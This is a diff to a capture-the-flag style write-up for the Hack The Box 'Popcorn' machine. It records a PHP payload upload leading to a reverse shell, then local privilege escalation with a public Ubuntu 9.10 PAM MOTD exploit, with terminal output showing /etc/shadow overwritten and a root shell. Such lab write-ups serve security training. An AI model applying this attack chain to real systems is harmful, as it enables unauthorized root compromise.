@@ -94,4 +94,39 @@ Content-Type: image/gif
 ```
 - PHP Info can now be seen via `/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php`
 
-- Weaponized payload uploaded to OSWE/HTB/Popcorn/Payloads/weaponized.php
+- Weaponized payload uploaded to OSWE/HTB/Popcorn/Payloads/weaponized.php -> Reverse Shell -> User flag.txt
+
+# Priv-Esc
+```bash
+lsb_release -a
+
+# No LSB modules are available.
+# Distributor ID: Ubuntu
+# Description:    Ubuntu 9.10
+# Release:        9.10
+# Codename:       karmic
+```
+- Research Ubuntu 9.10 Karmix exploits
+-- https://www.exploit-db.com/exploits/14339
+-- Needed to adjust instances of `~/` to `/var/www` since we do not have a $HOME set
+```bash
+www-data@popcorn:/var/www$ bash exploit.sh                                                                                                                                           [27/1481]
+bash exploit.sh                                                                                                                                                                               
+[*] Ubuntu PAM MOTD local root                                                                                                                                                                
+[*] Backuped /var/www/.ssh/authorized_keys                                                                                                                                                    
+[*] SSH key set up                                                                                                                                                                            
+[*] Backuped /var/www/.cache                                                                                                                                                                  
+[*] spawn ssh                                                                                                                                                                                 
+[+] owned: /etc/passwd                                                                                                                                                                        
+[*] spawn ssh                                                                                                                                                                                 
+[+] owned: /etc/shadow                                                                                                                                                                        
+[*] Restored /var/www/.cache                                                                                                                                                                  
+[*] Restored /var/www/.ssh/authorized_keys
+[*] SSH key removed      
+[+] Success! Use password toor to get root
+Password: toor                                                                                 
+                                               
+root@popcorn:/var/www# whoami
+whoami
+root                       
+```
